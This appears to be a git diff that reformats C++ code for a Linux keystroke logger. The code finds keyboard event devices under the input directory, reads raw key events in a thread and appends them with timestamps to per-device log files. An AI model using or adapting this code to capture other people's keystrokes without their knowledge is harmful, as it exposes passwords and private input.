@@ -13,26 +13,21 @@
 #include <linux/input.h>
 #include <linux/version.h>
 #include <sys/ioctl.h>
-
 #include "constants.hh"
 
 static void* _startCapture(void* threadData);
 
-static int _isEventDevice(const struct dirent *directory)
-{
+static int _isEventDevice(const struct dirent *directory) {
     return strncmp(EVENT_DEVICE_NAME.c_str(), directory->d_name, 5) == 0;
 }
 
 class Keyboard {
-
     public:
-    std::string devicePath;
-    std::string captureLog;
+    std::string devicePath, captureLog;
     int deviceFile;
 
     Keyboard(std::string devPath, std::string capLog) {
-        devicePath = devPath;
-        captureLog = capLog;
+        devicePath = devPath, captureLog = capLog;
         deviceFile = -1;
     }
 
@@ -56,8 +51,7 @@ class Keyboard {
     pthread_t _captureThread;
 };
 
-std::vector<Keyboard> findKeyboards()
-{
+std::vector<Keyboard> findKeyboards() {
     struct dirent **nameList;
     std::vector<Keyboard> keyboards;
 
@@ -73,7 +67,6 @@ std::vector<Keyboard> findKeyboards()
         deviceName = nameList[i]->d_name;
         devicePath = INPUT_DEVICE_DIR + deviceName;
         deviceFile = open(devicePath.c_str(), O_RDONLY);
-
         if (deviceFile < 0) {
             continue;
         }
@@ -88,28 +81,24 @@ std::vector<Keyboard> findKeyboards()
             Keyboard keyboard(devicePath, deviceName + ".log");
             keyboards.push_back(keyboard);
         }
-
         free(nameList[i]);
     }
 
     return keyboards;
 }
 
-static void* _startCapture(void* threadData)
-{
-    // Retrieve and cast Keyboard instance from threadData
-    Keyboard *keyboard;
-    keyboard = (Keyboard *) threadData;
-
+static void* _startCapture(void* threadData) {
     int readEvent;
     struct input_event keyEvent[64];
+
+    // Retrieve and cast Keyboard instance from threadData
+    Keyboard* keyboard = (Keyboard *) threadData;
 
     // Open log file and keyboard device file
     std::ofstream logFileStream (keyboard->captureLog, std::ios::app);
     keyboard->openDeviceFile();
 
     if (keyboard->deviceFile > 0) {
-
         // Write timestamp
         std::time_t time = std::time(nullptr);
         logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
